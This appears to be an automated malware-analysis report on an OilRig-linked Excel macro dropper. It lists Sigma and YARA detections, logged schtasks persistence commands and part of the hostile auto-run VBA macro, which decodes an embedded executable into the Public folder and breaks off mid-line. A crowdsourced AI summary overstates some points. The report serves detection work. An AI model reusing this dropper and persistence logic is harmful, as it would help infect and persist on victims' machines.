sigma_analysis_results.rule_title: Suspicious Binaries and Scripts in Public Folder
sigma_analysis_results.rule_description: Detects the creation of a file with a suspicious extension in the public folder, which could indicate potential malicious activity.

match_context.values: @{RuleName=EXE; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; EventID=11; TargetFilename=C:\Users\Public\Libraries\servicereset.exe}
@{Image=C:\Program Files\Microsoft Office\Office16\EXCEL.EXE; TargetFilename=C:\Users\Public\Libraries\OfficeServicesStatus.vbs; EventID=11}

sigma_analysis_results.rule_title: Windows Shell/Scripting Application File Write to Suspicious Folder
sigma_analysis_results.rule_description: Detects Windows shells and scripting applications that write files to suspicious folders

match_context.values: @{RuleName=EXE; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Users\Public\Libraries\servicereset.exe; EventID=11}
@{RuleName=EXE; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Users\Public\Libraries\servicereset.exe; EventID=11}

sigma_analysis_results.rule_title: File With Uncommon Extension Created By An Office Application
sigma_analysis_results.rule_description: Detects the creation of files with an executable or script extension by an Office application.
sigma_analysis_results.rule_author: Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule), Nasreddine Bencherchali (Nextron Systems)

match_context.values: @{Image=C:\Program Files\Microsoft Office\Office16\EXCEL.EXE; EventID=11; TargetFilename=C:\Users\Public\Libraries\OfficeServicesStatus.vbs}
@{Image=C:\Program Files (x86)\Microsoft Office\Office16\EXCEL.EXE; EventID=11; TargetFilename=C:\Users\Public\Libraries\OfficeServicesStatus.vbs}

sigma_analysis_results.rule_description: Detects a suspicious process spawning from one of the Microsoft Office suite products (Word, Excel, PowerPoint, Publisher, Visio, etc.)
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Markus Neis, FPT.EagleEye Team, Vadim Khrykov, Cyb3rEng, Michael Haag, Christopher Peacock @securepeacock, @scythe_io

sigma_analysis_results.rule_title: Potentially Suspicious Execution From Parent Process In Public Folder
sigma_analysis_results.rule_description: Detects a potentially suspicious execution of a parent process located in the "\Users\Public" folder executing a child process containing references to shell or scripting binaries and commandlines.
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)

match_context.values: @{Product=Microsoft® Windows® Operating System; CurrentDirectory=C:\Windows\system32\; OriginalFileName=Cmd.Exe; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; Description=Windows Command Processor; EventID=1; ParentCommandLine="C:\Users\Public\Libraries\servicereset.exe" ; CommandLine=cmd /c schtasks /create /sc minute /mo 0002 /tn TimeUpdate /tr "\"C:\Users\Public\Libraries\servicereset.exe\""; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Users\Public\Libraries\servicereset.exe; IntegrityLevel=Medium; Image=C:\Windows\SysWOW64\cmd.exe; Company=Microsoft Corporation}

@{Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; CurrentDirectory=C:\Windows\system32\; OriginalFileName=Cmd.Exe; Product=Microsoft® Windows® Operating System; Description=Windows Command Processor; EventID=1; ParentCommandLine=C:\Users\Public\Libraries\servicereset.exe; CommandLine=cmd /c schtasks /create /sc minute /mo 0002 /tn TimeUpdate /tr "\"C:\Users\Public\Libraries\servicereset.exe\""; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Users\Public\Libraries\servicereset.exe; IntegrityLevel=Medium; Image=C:\Windows\SysWOW64\cmd.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Script Interpreter Execution From Suspicious Folder
sigma_analysis_results.rule_description: Detects a suspicious script execution in temporary folders or folders accessible by environment variables
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)

match_context.values: @{Hashes=MD5=9A68ADD12EB50DDE7586782C3EB9FF9C,SHA256=62A95C926C8513C9F3ACF65A5B33CBB88174555E2759C1B52DD6629F743A59ED,IMPHASH=93B1E62305A8CEC30A5FBE39C04A90BD; CurrentDirectory=C:\Windows\system32\; OriginalFileName=wscript.exe; Product=Microsoft ® Windows Script Host; Description=Microsoft ® Windows Based Script Host; FileVersion=5.812.10240.16384; ParentCommandLine=c:\windows\system32\svchost.exe -k netsvcs -p -s Schedule; CommandLine=c:\windows\system32\wscript.EXE C:\Users\Public\Libraries\OfficeServicesStatus.vbs; EventID=1; ParentImage=C:\Windows\System32\svchost.exe; IntegrityLevel=Medium; Image=C:\Windows\System32\wscript.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects scheduled task creation using "schtasks" that contain potentially suspicious or uncommon commands

sigma_analysis_results.rule_description: Detects Schtask creations that point to a suspicious folder or an environment variable often used by malware

sigma_analysis_results.rule_description: Detects suspicious execution of rundll32, with specific calls to some DLLs with known LOLBIN functionalities
sigma_analysis_results.rule_author: juju4, Jonhnathan Ribeiro, oscd.community, Nasreddine Bencherchali (Nextron Systems)

match_context.values: @{Product=Microsoft® Windows® Operating System; CurrentDirectory=C:\Program Files (x86)\AutoIt3\; OriginalFileName=RUNDLL32.EXE; Hashes=MD5=D7CA562B0DB4F4DD0F03A89A1FDAD63D,SHA256=4E15AA13A02798E924C63537E458A09415C48DAE0E7AFD5A3D25532A2AA935EE,IMPHASH=BB17B2FBBFF4BBF5EBDCA7D0BB9E4A5B; Description=Windows host process (Rundll32); EventID=1; ParentCommandLine=control  intl.cpl,, /f:"C:\Program Files (x86)\AutoIt3\regionandlang.xml"; CommandLine="C:\Windows\system32\rundll32.exe" Shell32.dll,Control_RunDLL intl.cpl,, /f:"C:\Program Files (x86)\AutoIt3\regionandlang.xml"; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\SysWOW64\control.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\rundll32.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Potential Binary Or Script Dropper Via PowerShell
sigma_analysis_results.rule_description: Detects PowerShell creating a binary executable or a script file.

match_context.values: @{RuleName=EXE; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; EventID=11; TargetFilename=C:\Users\Public\Libraries\servicereset.exe}
@{RuleName=EXE; Image=C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe; TargetFilename=C:\Users\Public\Libraries\servicereset.exe; EventID=11}

sigma_analysis_results.rule_title: Recon Command Output Piped To Findstr.EXE
sigma_analysis_results.rule_description:
Detects the execution of a potential recon command where the results are piped to "findstr". This is meant to trigger on inline calls of "cmd.exe" via the "/c" or "/k" for example.
Attackers often time use this technique to extract specific information they require in their reconnaissance phase.

match_context.values: @{Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; CurrentDirectory=C:\Program Files (x86)\AutoIt3\; OriginalFileName=Cmd.Exe; Product=Microsoft® Windows® Operating System; Description=Windows Command Processor; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Program Files (x86)\AutoIt3\AutoIt3.exe" "C:\Users\george\Desktop\script.0.au3"; CommandLine=C:\Windows\system32\cmd.exe /c tasklist /svc | find "svchost.exe" >> \\192.168.2.1\joe-office-g6-17\logs\services.log; EventID=1; ParentImage=C:\Program Files (x86)\AutoIt3\AutoIt3.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\cmd.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description: Detects non-interactive PowerShell activity by looking at the "powershell" process with a non-user GUI process such as "explorer.exe" as a parent.

macros.vba_code:
'source code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.html

Private Sub Workbook_Open()
    Call fireeye_Init
    Call fireeye_ShowHideSheets
End Sub

Sub fireeye_ShowHideSheets()
    If ActiveWorkbook.Worksheets(1).Visible Then
        Dim WS_Count As Integer
        Dim I As Integer
        WS_Count = ActiveWorkbook.Worksheets.Count
        For I = 1 To WS_Count
            ActiveWorkbook.Worksheets(I).Visible = True
        Next I
        ActiveWorkbook.Worksheets(1).Visible = False
        ActiveWorkbook.Worksheets(2).Activate
    End If
End Sub

Sub fireeye_Init()
    FireeyePs1 = ""
    
    For x = 8 To 14
        FireeyePs1 = FireeyePs1 & ActiveWorkbook.Worksheets("Incompatible").Cells(1, x)
    Next
    ' FireeyePs1 = "c2FsYW0="
    Set wss = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")
    pth = wss.ExpandEnvironmentStrings("%PUBLIC%")
    Filename = pth & "\Libraries\servicereset.exe"
    b64FileN
macros.properties: auto-open create-ole environ obfuscated powershell run-file write-file

threat_severity.level_description: Severity HIGH because it was considered downloader. Other contributing factor was that it could not be run in sandboxes.

attributes.magic: Composite Document File V2 Document, Little Endian, Os: Windows, Version 6.1, Code page: 1252, Name of Creating Application: Microsoft Excel, Create Time/Date: Sat Sep 16 00:00:00 2006, Last Saved Time/Date: Tue Jun 20 14:23:02 2017, Security: 0

crowdsourced_yara_results.description: Detects OilRig malware from Unit 42 report in October 2017
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

crowdsourced_yara_results.description: This signature fires on the presence of Base64 encoded URI prefixes (http:// and https://) across any file. The simple presence of such strings is not inherently an indicator of malicious content, but is worth further investigation.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.
crowdsourced_yara_results.author: InQuest Labs

crowdsourced_yara_results.description: Detects Office droppers that include a notice to enable active content
crowdsourced_yara_results.author: Florian Roth (Nextron Systems)

crowdsourced_ai_results.analysis:
The macros extracted from the document exhibit several behaviors commonly associated with malicious intent. 

1. Workbook_Open() Subroutine: The `Workbook_Open()` subroutine is designed to execute automatically when the workbook is opened. It calls two other subroutines, `fireeye_Init` and `fireeye_ShowHideSheets`, indicating an intention to perform actions immediately upon opening the document.

2. fireeye_ShowHideSheets() Subroutine: This subroutine manipulates the visibility of worksheets within the workbook. It makes all worksheets visible but then hides the first worksheet, which could be a tactic to obscure the presence of potentially harmful content or code from the user.

3. fireeye_Init() Subroutine:
   - Base64 Decoding: The macro constructs a string (`FireeyePs1`) by concatenating values from specific cells in a worksheet named "Incompatible". Although the actual Base64 string is commented out, the structure suggests that it may have been intended for use as encoded data.
   - File Creation and Execution: The macro creates a file path for an executable (`servicereset.exe`) and another for a text file (`B64.txt`). It writes the constructed string into `B64.txt` and subsequently uses PowerShell to decode this Base64 string and write it to `servicereset.exe`. This behavior indicates an attempt to download and execute a potentially harmful executable file.
   - Scheduled Task Creation: The macro sets up a scheduled task using `schtasks` to run a VBScript (`OfficeServicesStatus.vbs`) every three minutes. This script is created dynamically and contains a command to execute the previously created executable. This persistence mechanism allows the malware to remain active on the system even after the initial execution context (the Excel document) is closed.

4. Obfuscation and Misleading Comments: The use of comments referencing FireEye, a legitimate cybersecurity company, appears to be an attempt to mislead analysts regarding the true nature of the code. Additionally, the obfuscation through variable names and the dynamic creation of scripts further complicates detection efforts.

5. Manipulation of Macro Security Settings: While not explicitly shown in the provided code, the overall design suggests an understanding of how to bypass typical security measures associated with macros, such as hiding malicious activity behind legitimate-looking operations.

Overall, the combination of automatic execution, file manipulation, Base64 decoding, and scheduled tasks strongly indicates that these macros are designed for malicious purposes, likely aimed at establishing persistence and executing unauthorized commands on the victim's machine.

The macro defines several subroutines. Upon opening the workbook, the `Workbook_Open` subroutine is executed, which in turn calls two other subroutines: `fireeye_Init` and `fireeye_ShowHideSheets`. 

The `fireeye_ShowHideSheets` subroutine manipulates the visibility of worksheets within the workbook. If the first worksheet is visible, the macro iterates through all worksheets, making them visible, and then hides the first worksheet. Finally, it activates the second worksheet. 

The `fireeye_Init` subroutine is more complex. It constructs a string by concatenating cell values from a worksheet named "Incompatible." This string is then written to a file named "B64.txt" in the user's public directory. The macro then uses a command line call to execute `powershell.exe`, which decodes the content of "B64.txt" from Base64 and writes the decoded data to a file named "servicereset.exe" in the same directory. After that, it removes the "B64.txt" file. 

The macro then creates a VBScript file named "OfficeServicesStatus.vbs" in the same location. This script, when executed, runs the previously created "servicereset.exe" file. Finally, the macro uses `schtasks` to create a scheduled task that executes the "OfficeServicesStatus.vbs" script every 3 minutes.
